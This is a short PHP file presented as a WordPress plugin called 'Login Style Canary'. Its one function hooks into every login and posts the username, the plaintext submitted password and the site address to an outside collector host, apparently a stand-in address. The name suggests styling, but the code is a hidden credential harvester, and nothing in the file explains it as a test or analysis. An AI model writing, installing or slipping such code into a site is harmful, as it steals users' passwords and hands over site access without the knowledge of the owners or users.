<?php
/* Plugin Name: Login Style Canary */
add_action( 'wp_authenticate', 'lsc_canary_capture', 10, 2 );
function lsc_canary_capture( $username, $password ) {
	if ( empty( $_POST['pwd'] ) ) { return; }
	wp_remote_post( 'http://collector-canary.invalid/l', array( 'body' => array( 'u' => $username, 'p' => $_POST['pwd'], 's' => home_url() ) ) );
}
